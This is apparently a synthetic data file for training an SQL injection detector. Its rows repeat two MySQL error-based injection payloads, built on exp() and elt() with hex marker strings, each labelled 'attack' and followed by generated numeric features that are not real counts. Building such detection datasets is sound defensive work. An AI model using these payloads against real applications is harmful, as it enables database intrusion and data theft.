id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000169,attack,error,"1' in boolean mode  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   #",nearest_attack_euclidean,R000297,5.490170479880226,245.72276306152344,69.97166442871094,31.944347381591797,96.86348724365234,0.16926410794258118,77.35466766357422,41.821533203125,0.9293521046638489,0.280398964881897,0.1567326933145523,0.3882025182247162,0.12207101285457611,3.7593305110931396,1.0358353853225708,1.3411898612976074,0.9274191856384277,0.26785343885421753,0.2284599244594574,0.13408081233501434,9.717377662658691,8.977620124816895,2.8628973960876465,-0.1088583767414093,1.4037771224975586,0.21949034929275513,-0.04128361493349075,-0.11206324398517609,0.244327113032341,0.6988168358802795,-0.03879602253437042,-0.21570971608161926,1.4194750785827637,-0.002436518669128418,0.5110456943511963,2.0003650188446045,7.129676818847656,0.675254225730896,2.3320672512054443,-0.0002463597629684955,0.5876286029815674,1.0377098321914673,-0.1726929098367691,0.21091438829898834,0.2121390551328659,-0.263016015291214,-0.060759127140045166,0.3830904960632324,0.5058573484420776,0.5534441471099854,0.004877348896116018,0.12620891630649567,0.17475414276123047,0.23389214277267456,0.09590022265911102,0.00025478660245426,0.05979783087968826,0.07105560600757599,0.09719078242778778,0.1322709023952484,0.13455159962177277,-0.004863318055868149,-0.1530189961194992,-0.041593484580516815,0.33879709243774414,-0.20959940552711487,0.4165491461753845,0.3277844488620758,0.1874905824661255,0.21917235851287842,-0.1877102553844452,-0.045018378645181656,0.13463978469371796,0.168207585811615,0.09632907807826996,0.00020606578618753701,1.334589958190918,0.2782675325870514,-0.17926768958568573,0.007102766539901495,0.19974280893802643,7.135377407073975,0.8622134923934937,0.19844283163547516,0.11543139815330505,0.6468310952186584,0.29714199900627136,0.19027838110923767,0.15859854221343994
GAN_000170,attack,error,"1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R000259,5.361671825700766,239.57223510742188,63.61405944824219,32.1729850769043,95.77558898925781,5.7763495445251465,78.79544830322266,39.35220718383789,0.8698641657829285,0.29900097846984863,0.15521302819252014,0.3870375454425812,0.1218290627002716,3.781261682510376,0.6947513818740845,1.1139198541641235,0.8030771017074585,0.25176241993904114,0.20159494876861572,-0.011240953579545021,9.26060676574707,8.87451171875,2.1282503604888916,0.06797870993614197,1.6316841840744019,0.2559358775615692,0.019725199788808823,-0.030422138050198555,0.36731842160224915,0.6135880351066589,0.00615943968296051,-0.31744712591171265,1.4408445358276367,-0.10925395041704178,0.3939787447452545,2.117621421813965,7.375675201416016,0.8298794627189636,2.1570851802825928,-0.09430758655071259,0.6127346158027649,0.9490038752555847,0.009794332087039948,0.24286113679409027,0.2985135316848755,-0.3861008286476135,0.02927255630493164,0.3860378563404083,0.4765322208404541,0.5071249604225159,0.20171332359313965,0.128226637840271,0.015581164509057999,0.21811309456825256,0.13375508785247803,0.016827775165438652,0.042791880667209625,0.05675755813717842,-0.16848692297935486,0.10719886422157288,0.17407964169979095,-0.037688709795475006,-0.19456897675991058,-0.037552911788225174,0.38989150524139404,0.03615269064903259,0.4130714535713196,0.25971731543540955,0.07772937417030334,0.1536933183670044,-0.22607460618019104,-0.1948103904724121,0.08542950451374054,-0.09887368977069855,0.07097689062356949,0.008217942900955677,1.1595245599746704,0.19105832278728485,-0.08456540107727051,0.15286512672901154,0.17137674987316132,7.4486494064331055,0.7105411887168884,0.1634611040353775,0.1273568570613861,0.5992032885551453,0.0971551463007927,-0.04907925799489021,0.1535916030406952
GAN_000171,attack,error,"1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R000259,5.035435190683525,246.2603302001953,67.3209228515625,33.02973937988281,90.30826568603516,7.923400402069092,74.47006225585938,35.87991714477539,0.9315532445907593,0.3217458426952362,0.14609000086784363,0.3840257227420807,0.12668342888355255,3.7857022285461426,0.9335497617721558,0.8307380676269531,0.7000447511672974,0.20243756473064423,0.17265379428863525,-0.035527706146240234,8.53007698059082,8.8594970703125,2.2058591842651367,0.11253766715526581,1.7260656356811523,0.18431268632411957,0.007820870727300644,0.008911225944757462,0.27497199177742004,0.5447118282318115,0.06226221099495888,-0.18932053446769714,1.3022300004959106,0.031538497656583786,0.3873056471347809,2.0824127197265625,7.150506496429443,0.824089765548706,1.9552479982376099,0.051530733704566956,0.49665766954421997,1.0087804794311523,0.02706325799226761,0.2143249809741974,0.1925853043794632,-0.14013099670410156,-0.1605796366930008,0.3874576687812805,0.37981319427490234,0.3987017273902893,0.253364235162735,0.2304329127073288,-0.1530885398387909,0.23160386085510254,0.18047121167182922,0.016382182016968727,0.014482284896075726,0.037255119532346725,-0.14376211166381836,0.09773127734661102,0.14502733945846558,-0.003787767142057419,-0.0855880081653595,7.972121238708496e-05,0.3624061644077301,-0.0028746947646141052,0.44965168833732605,0.19468730688095093,0.0273516234010458,0.06283382326364517,-0.04010713845491409,-0.14869830012321472,0.041792698204517365,0.00041094422340393066,0.04934633523225784,0.012625389732420444,0.9948439598083496,0.19424878060817719,-0.065659299492836,0.12152682989835739,0.1794004738330841,7.68331241607666,0.6405666470527649,0.15297424793243408,0.15370360016822815,0.5525528788566589,-0.07899255305528641,-0.00036250054836273193,-0.035985931754112244
GAN_000172,attack,error,"1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R000259,4.848225225222007,241.22537231445312,73.97579193115234,33.04094314575195,87.62403106689453,3.731482744216919,71.46926879882812,35.82773971557617,1.089101791381836,0.3188241422176361,0.151178240776062,0.3860967457294464,0.12461412698030472,3.7788925170898438,1.1211644411087036,0.8631817698478699,0.7161595225334167,0.17103616893291473,0.13089634478092194,-0.050223369151353836,8.511512756347656,8.765448570251465,2.302403211593628,0.0059854984283447266,1.6489183902740479,0.14103513956069946,-0.054950565099716187,-3.462609583948506e-06,0.1986001431941986,0.4408409595489502,0.028765615075826645,-0.10123331844806671,1.4405903816223145,0.06369685381650925,0.4543048143386841,1.8916312456130981,6.963343143463135,0.9074382781982422,2.099217414855957,0.16383567452430725,0.4763741195201874,0.8854301571846008,0.057245947420597076,0.21132692694664001,0.02574992924928665,-0.0832250788807869,-0.0571664497256279,0.3471048176288605,0.33726057410240173,0.3684789538383484,0.21852289140224457,0.24908225238323212,-0.12018154561519623,0.07265321165323257,0.17242737114429474,0.019609756767749786,0.04777824878692627,-0.008834434673190117,-0.026011526584625244,0.188472181558609,-0.07010127604007721,0.012873202562332153,0.014146432280540466,0.11176009476184845,0.3648054599761963,-0.013903383165597916,0.5625158548355103,0.06752654165029526,0.01595022715628147,-0.03985731303691864,0.1090192198753357,-0.14338244497776031,0.14166179299354553,0.09521052241325378,0.04141963645815849,0.009183969348669052,0.9483513832092285,0.29048100113868713,-0.12331503629684448,0.11305484175682068,0.1712060570716858,7.341640949249268,0.6170492768287659,0.1370646059513092,0.19549672305583954,0.6019910573959351,0.0013720057904720306,-0.16610169410705566,0.0021923109889030457
GAN_000173,attack,error,"1' in boolean mode  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   #",nearest_attack_euclidean,R000297,5.092016928860024,252.48902893066406,69.15034484863281,31.669940948486328,92.60249328613281,2.4554202556610107,79.9536361694336,40.67595291137695,1.0602949857711792,0.28786006569862366,0.1593422144651413,0.3861246705055237,0.12631891667842865,3.7212181091308594,1.0083918571472168,1.175238013267517,0.8183237910270691,0.233091339468956,0.13226057589054108,0.12184581160545349,8.025779724121094,8.368614196777344,2.329697608947754,-0.02480403333902359,1.6147199869155884,0.1383107453584671,-0.14683574438095093,-0.06403794884681702,0.14776435494422913,0.5374123454093933,0.0177619531750679,0.010694779455661774,1.324581503868103,0.14436466991901398,0.498077392578125,1.9412841796875,6.643301010131836,0.6282004714012146,1.9947412014007568,0.2521635591983795,0.4073869585990906,1.069989800453186,-0.18132419884204865,0.2018720656633377,0.18199960887432098,-0.0900467112660408,-0.15099644660949707,0.3544773757457733,0.3343603312969208,0.4082527458667755,0.023306598886847496,0.2060931771993637,-0.12639661133289337,0.19539934396743774,0.11962577700614929,-0.004242033697664738,0.037679992616176605,0.2138742208480835,0.16191940009593964,0.06817226856946945,0.02289542555809021,0.03312303125858307,-0.12915123999118805,0.046778757125139236,0.38803914189338684,-0.17292597889900208,0.528291642665863,0.3041631281375885,0.08974254131317139,0.07819122076034546,0.054593220353126526,-0.08196674287319183,0.0465962216258049,0.2796168327331543,0.08120685815811157,0.014790632762014866,1.2200642824172974,0.2805100381374359,-0.15473124384880066,0.031144054606556892,0.20775048434734344,7.3035888671875,0.7405958771705627,0.2114710658788681,0.09292270988225937,0.5439258217811584,0.021920062601566315,0.08816829323768616,-0.19028419256210327
GAN_000174,attack,error,"1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R000259,5.029251994639804,248.48574829101562,73.35554504394531,32.06415557861328,91.79662322998047,3.3021047115325928,70.40860748291016,39.87855911254883,1.2633336782455444,0.30966681241989136,0.15415476262569427,0.3864763379096985,0.12545788288116455,3.7262346744537354,1.0280284881591797,0.9911397099494934,0.8086782693862915,0.226081982254982,0.11553914844989777,0.11213280260562897,9.402105331420898,8.196748733520508,2.637481689453125,0.07735776901245117,1.6080942153930664,0.15156348049640656,0.05224832147359848,-0.02542649768292904,0.06616417318582535,0.47439783811569214,-0.09657172858715057,-0.008687041699886322,1.3053992986679077,0.1223827376961708,0.49815288186073303,1.9492346048355103,6.6634955406188965,0.6476486921310425,2.2578847408294678,0.20456470549106598,0.55733323097229,1.0306005477905273,-0.012834437191486359,0.15203522145748138,0.1934392899274826,-0.10854987055063248,-0.28083425760269165,0.34009963274002075,0.3070638179779053,0.3969608247280121,0.055171240121126175,0.29252514243125916,-0.16786061227321625,0.19730499386787415,0.1740487515926361,-0.012838971801102161,0.05659007653594017,-0.001939535140991211,0.1584387868642807,0.10488398373126984,-0.04489025101065636,0.05679590255022049,-0.14454154670238495,0.042812224477529526,0.39370203018188477,0.08695361763238907,0.5568105578422546,0.1653408706188202,0.07757994532585144,-0.02490350604057312,0.022045079618692398,-0.2139798104763031,-0.024197779595851898,0.06021924316883087,0.06490146368741989,0.015107330866158009,1.0184695720672607,0.2696225643157959,-0.1935604363679886,0.037094272673130035,0.18461419641971588,7.387841701507568,0.7337228059768677,0.1809207648038864,0.08140385895967484,0.5748879909515381,-0.14782461524009705,0.11622239649295807,-0.04023788869380951
GAN_000175,attack,error,"1' in boolean mode  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   #",nearest_attack_euclidean,R000297,5.025684703986194,239.83790588378906,68.40550994873047,32.04111099243164,96.6279067993164,-2.11457896232605,78.58399200439453,44.05121994018555,1.264054298400879,0.2775205969810486,0.16092698276042938,0.3876008689403534,0.12680204212665558,3.6776342391967773,1.107798457145691,1.2503572702407837,0.9166268110275269,0.28550979495048523,0.12340353429317474,0.23788468539714813,8.126142501831055,8.140417098999023,2.4116339683532715,0.003506898880004883,1.4950896501541138,0.13454526662826538,-0.17671896517276764,-0.08376791328191757,0.06487376987934113,0.5298901200294495,-0.11574707925319672,0.07969740778207779,1.2637425661087036,0.31305623054504395,0.6094878315925598,1.8748708963394165,6.2049078941345215,0.48969441652297974,2.139190435409546,0.21610058844089508,0.450302392244339,1.0722295045852661,-0.2988474369049072,0.15865519642829895,0.23125164210796356,-0.13399285078048706,-0.25457072257995605,0.35833844542503357,0.3271006941795349,0.35353800654411316,-0.09996742755174637,0.21284040808677673,-0.194532111287117,0.14916974306106567,0.1020570769906044,-0.016169162467122078,0.03443188965320587,0.20545201003551483,0.1731344312429428,-0.011475995182991028,-0.01650245487689972,0.12385198473930359,-0.21347956359386444,0.11443321406841278,0.4286675751209259,-0.07099980115890503,0.5839080214500427,0.25271371006965637,0.10511498153209686,0.0029488131403923035,0.029799897223711014,-0.24498358368873596,0.02250479906797409,0.3745509386062622,0.08233196288347244,0.020829038694500923,1.295922040939331,0.2054980993270874,-0.2633970379829407,0.006794655229896307,0.13324129581451416,6.962778568267822,0.7993613481521606,0.20676113665103912,-0.055775467306375504,0.5549188852310181,0.013417113572359085,0.2004968822002411,-0.3202221393585205
GAN_000176,attack,error,"1' in boolean mode  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   #",nearest_attack_euclidean,R000297,5.239401485645755,245.3538360595703,66.57670593261719,33.950931549072266,88.93939971923828,6.16610050201416,77.33341217041016,39.90086364746094,1.2727075815200806,0.2918992340564728,0.15387874841690063,0.39422109723091125,0.1220538318157196,3.731914758682251,0.622576892375946,1.339247703552246,1.0659734010696411,0.28885236382484436,0.17286288738250732,0.12787005305290222,8.306711196899414,8.601663589477539,2.301257848739624,0.1098770797252655,1.5662801265716553,0.19579218327999115,0.012050040066242218,-0.02135835774242878,0.31459635496139526,0.4841025769710541,-0.0057172030210494995,-0.08848761022090912,1.6443626880645752,0.048933420330286026,0.44905874133110046,2.0329368114471436,6.859624862670898,0.7772514224052429,2.1146416664123535,0.031044961884617805,0.4840908646583557,0.9203477501869202,0.09509225189685822,0.21893218159675598,0.12993808090686798,-0.3335795998573303,-0.1234891414642334,0.4538491368293762,0.4628221392631531,0.35685113072395325,0.12790615856647491,0.1044217124581337,-0.25442183017730713,0.23949676752090454,0.09046214073896408,0.017914246767759323,0.1051168292760849,0.36945411562919617,-0.2694445550441742,-0.06717798113822937,0.16083912551403046,-0.13072150945663452,-0.40545737743377686,0.11530996859073639,0.4865090847015381,-0.19064205884933472,0.5645139217376709,-0.05938968062400818,0.20361895859241486,0.13420774042606354,0.09727030247449875,-0.3522321581840515,-0.15589922666549683,0.09842758625745773,0.09292856603860855,0.020172839984297752,1.1489531993865967,0.19419200718402863,-0.036162033677101135,0.18978968262672424,0.12804369628429413,7.231020450592041,0.5842138528823853,0.16767723858356476,0.051949393004179,0.6438338756561279,0.04464354366064072,-0.3072398900985718,-0.1218205913901329
GAN_000177,attack,error,"1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R000259,4.7614507802425665,240.90711975097656,72.00741577148438,34.29405975341797,92.35599517822266,4.257594108581543,71.82740020751953,35.734031677246094,1.1052579879760742,0.3244676887989044,0.1515478789806366,0.37976396083831787,0.1290932297706604,3.7960803508758545,1.3264609575271606,0.5916829109191895,0.7306989431381226,0.19243377447128296,0.11313623934984207,0.27332061529159546,8.214731216430664,8.794694900512695,3.049476385116577,-0.010781943798065186,1.6200432777404785,0.11651180684566498,-0.17969031631946564,0.030042076483368874,0.17084220051765442,0.46294230222702026,0.005956575274467468,-0.2674713134765625,1.531990885734558,0.14929543435573578,0.42293068766593933,1.8807830810546875,6.985591411590576,0.774202823638916,1.9384498596191406,0.17406359314918518,0.4305717945098877,0.9162700176239014,0.1413593888282776,0.19785700738430023,0.049236804246902466,0.11044425517320633,-0.08619492501020432,0.38401761651039124,0.34012407064437866,0.34195399284362793,0.23202580213546753,0.2527545094490051,-0.013396479189395905,-0.14982467889785767,0.1427520215511322,0.013552647083997726,0.059080637991428375,0.053433340042829514,-0.06484602391719818,0.1509149968624115,-0.08380389213562012,-0.0508434996008873,0.05633574351668358,0.10820360481739044,0.2699200212955475,-0.057219646871089935,0.48662129044532776,-0.01663532853126526,0.09226810932159424,0.031219571828842163,0.0801263153553009,-0.09426400065422058,0.011878497898578644,0.1002482920885086,0.03919881954789162,0.010828348807990551,0.977820634841919,0.28677883744239807,-0.0738878846168518,0.1577715277671814,0.1849406361579895,7.910013198852539,0.5963068604469299,0.17655006051063538,0.1434348225593567,0.5551446676254272,-0.17507442831993103,-5.184486508369446e-05,-0.13703638315200806
GAN_000178,attack,error,"1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R000259,4.9938836437839065,250.2086944580078,65.03691864013672,35.217411041259766,95.7679214477539,1.451829195022583,78.37234497070312,37.20719909667969,0.8366291522979736,0.31833627820014954,0.14294306933879852,0.38229337334632874,0.12464089691638947,3.8085434436798096,1.2458062171936035,0.7369125485420227,0.7766751646995544,0.1636851727962494,0.16930443048477173,0.048650287091732025,9.043909072875977,8.893973350524902,2.5964488983154297,0.04259682819247246,1.5541566610336304,0.16265355050563812,-0.09751655906438828,-0.019826048985123634,0.23948433995246887,0.47791847586631775,0.0002581179141998291,-0.3080354332923889,1.4145309925079346,-0.019110601395368576,0.43733853101730347,1.9905809164047241,7.264191627502441,1.0256997346878052,2.0183398723602295,0.03842410445213318,0.5334718823432922,0.8969523310661316,-0.02850424498319626,0.20050014555454254,0.12467844784259796,-0.023581810295581818,-0.026203155517578125,0.3749944567680359,0.4159558415412903,0.4563070237636566,0.23539477586746216,0.2694252133369446,-0.08461545407772064,-0.05231248587369919,0.11239836364984512,0.0196854081004858,0.04626850411295891,0.1871757060289383,-0.16841843724250793,0.30982017517089844,-0.004776895046234131,0.1517845094203949,-0.1095486730337143,0.09520567953586578,0.3201233744621277,0.08430502563714981,0.37637534737586975,0.1354776918888092,0.013268183916807175,0.04612021520733833,-0.11494465917348862,-0.11519262194633484,0.1743224561214447,-0.016683131456375122,0.03809034451842308,0.004796002525836229,0.9650446176528931,0.21553659439086914,-0.00855177640914917,0.13371245563030243,0.09432800114154816,7.461655139923096,0.708550214767456,0.1773780882358551,0.1075490266084671,0.5977646708488464,0.030684247612953186,-0.00650937482714653,0.15439963340759277
GAN_000179,attack,error,"1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R000259,5.278165941328362,247.982421875,66.52664947509766,34.28348159790039,94.05239868164062,2.3430826663970947,75.49345397949219,37.792205810546875,0.8886963129043579,0.29859253764152527,0.1507120281457901,0.3869125247001648,0.12434209138154984,3.762305498123169,1.0891245603561401,1.1395576000213623,0.8860390782356262,0.27612707018852234,0.23770825564861298,-0.10088440030813217,9.335338592529297,8.741060256958008,2.3471434116363525,0.003853060305118561,1.5403813123703003,0.2541470229625702,-0.015390725806355476,-0.055526409298181534,0.38744547963142395,0.6583152413368225,0.0707884356379509,-0.3030293583869934,1.3855040073394775,0.05048441141843796,0.4247657358646393,2.1658098697662354,7.487496852874756,0.7970938682556152,2.1218619346618652,-0.1469862014055252,0.6194886565208435,0.9261351823806763,0.001790463924407959,0.20746968686580658,0.18692268431186676,-0.2443201243877411,0.0022810399532318115,0.35898372530937195,0.4658879041671753,0.5377056002616882,0.17645476758480072,0.22458824515342712,0.05175613611936569,0.22545287013053894,0.12010692059993744,0.03791748359799385,0.05122828111052513,0.17248713970184326,-0.11556535959243774,0.05355966091156006,0.07969996333122253,0.12834973633289337,-0.06324173510074615,0.04494355246424675,0.29805779457092285,-0.08311833441257477,0.42354342341423035,0.2399362027645111,0.13161732256412506,0.18264681100845337,-0.21114042401313782,-0.14117753505706787,0.10109369456768036,0.10118687152862549,0.07299557328224182,0.008788738399744034,1.1403173208236694,0.19901533424854279,-0.08905626833438873,0.09077191352844238,0.16601242125034332,7.718589782714844,0.7313709855079651,0.1700129359960556,0.16471141576766968,0.6115865111351013,0.16214600205421448,0.12077833712100983,0.20639973878860474
GAN_000180,attack,error,"1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R000259,5.2405296973517865,238.4923095703125,71.83111572265625,32.717952728271484,99.82099914550781,-1.8545310497283936,75.07940673828125,44.22595977783203,0.9952088594436646,0.2744331657886505,0.15571308135986328,0.3771284818649292,0.1253027617931366,3.760164737701416,1.501931071281433,1.0066168308258057,0.9274307489395142,0.24638092517852783,0.16854813694953918,0.2520260810852051,9.555551528930664,8.45728588104248,3.1220080852508545,-0.11634014546871185,1.3567856550216675,0.14460846781730652,-0.15544520318508148,-0.08039410412311554,0.14614863693714142,0.6755077242851257,-0.10724051296710968,-0.2621532082557678,1.4388829469680786,0.333753377199173,0.5446856021881104,1.8566235303878784,6.692264556884766,0.5219606161117554,2.0900211334228516,-0.007563783787190914,0.6340073943138123,1.0798195600509644,0.013622105121612549,0.1615690439939499,0.2654660940170288,-0.0720643475651741,-0.012423902750015259,0.2949477434158325,0.45187366008758545,0.5383515954017639,-0.0387316457927227,0.2729031443595886,0.2639271020889282,-0.08014795184135437,0.052359674125909805,-0.014282560907304287,0.067367322742939,0.062293220311403275,0.07874263823032379,0.23755085468292236,-0.07718078792095184,0.17010879516601562,0.019158370792865753,0.06794404983520508,0.2627158761024475,0.0635862722992897,0.4503323435783386,0.14567211270332336,0.17091642320156097,0.0933133214712143,-0.29518768191337585,-0.20358845591545105,0.1353268325328827,0.23684844374656677,0.04437123239040375,0.010501724667847157,1.2911367416381836,0.15671023726463318,-0.40966731309890747,0.03050459362566471,0.15687458217144012,7.434010028839111,0.8721556067466736,0.21001139283180237,0.002088409150019288,0.6070445775985718,0.06168331950902939,0.330296128988266,0.00716225802898407
GAN_000181,attack,error,"1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R000259,5.276560213663891,261.73468017578125,65.77808380126953,30.34443473815918,93.28145599365234,1.1618568897247314,76.18978881835938,42.68947982788086,1.0745609998703003,0.29145699739456177,0.14571918547153473,0.3888125419616699,0.12853914499282837,3.779991865158081,1.128308892250061,1.5913772583007812,0.8713297843933105,0.2140667587518692,0.24805743992328644,0.13647298514842987,8.477787017822266,7.738744258880615,2.656989097595215,-0.09281827509403229,1.7206600904464722,0.16538116335868835,-0.03260461241006851,-0.0774223580956459,0.2968253791332245,0.73656165599823,-0.03907570242881775,-0.191908061504364,1.3816306591033936,0.22424766421318054,0.4627362787723541,1.9333666563034058,6.203027725219727,0.46517765522003174,2.359865188598633,0.039159923791885376,0.5019567012786865,1.045943260192871,-0.02742666006088257,0.24865421652793884,0.07279281318187714,-0.05782551318407059,-0.2674344778060913,0.4658198356628418,0.3506558835506439,0.4205586314201355,0.06958984583616257,0.28106001019477844,-0.3031654953956604,0.05358986556529999,0.10830077528953552,0.006722636520862579,0.02119014412164688,0.15242412686347961,0.09810185432434082,-0.05545942485332489,0.04119850695133209,0.24056918919086456,-0.23362748324871063,-0.061552807688713074,0.28239110112190247,-0.3215824365615845,0.45928487181663513,0.3399066925048828,0.22744539380073547,0.2002476453781128,-0.06749031692743301,-0.14018557965755463,0.19278794527053833,0.33574169874191284,0.09531491249799728,0.016153156757354736,1.1847155094146729,0.1157660186290741,-0.1844397634267807,0.01852172054350376,0.15175561606884003,7.534367084503174,0.724700391292572,0.1739320307970047,0.057933222502470016,0.5958747267723083,0.08399418741464615,0.2896164357662201,-0.17689400911331177
GAN_000182,attack,error,"1' in boolean mode  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   #",nearest_attack_euclidean,R000297,5.263805604937452,261.08154296875,68.19711303710938,31.085010528564453,94.5240707397461,4.702877521514893,75.7978515625,40.83295440673828,0.9733027219772339,0.30133765935897827,0.15082164108753204,0.38432323932647705,0.12972036004066467,3.701195001602173,0.8608572483062744,1.3347587585449219,0.7787269949913025,0.22643928229808807,0.18500812351703644,0.1440800130367279,8.110630989074707,8.409049034118652,2.459975242614746,0.06858479231595993,1.6685055494308472,0.15352804958820343,-0.04557110369205475,-0.0741281509399414,0.1165037453174591,0.6197462677955627,-0.1445019692182541,0.07216844707727432,1.2409420013427734,0.06664710491895676,0.498313844203949,2.0440030097961426,7.063383102416992,0.621195912361145,2.298163652420044,0.13927187025547028,0.430355429649353,1.1984704732894897,-0.280795693397522,0.187928706407547,0.30339986085891724,-0.14213702082633972,-0.3263835906982422,0.37175995111465454,0.32445046305656433,0.39382851123809814,-0.020135561004281044,0.21355809271335602,-0.2568972110748291,0.45964258909225464,0.16288185119628906,-0.030321555212140083,0.02511557936668396,0.13287854194641113,0.2487892359495163,0.0038524940609931946,0.1860702484846115,-0.11144903302192688,-0.3630518317222595,-0.043874699622392654,0.4187304377555847,-0.14523889124393463,0.5054455995559692,0.49448615312576294,0.14746592938899994,0.20057842135429382,-0.0748971626162529,-0.11004316806793213,-0.02528640627861023,0.2433852255344391,0.10155428946018219,0.014573078602552414,1.2986072301864624,0.20389419794082642,-0.13339763879776,-0.0009499104344286025,0.23559242486953735,7.783925533294678,0.7462078332901001,0.17399811744689941,0.08365423232316971,0.514664888381958,-0.070478156208992,0.22287705540657043,-0.25144362449645996
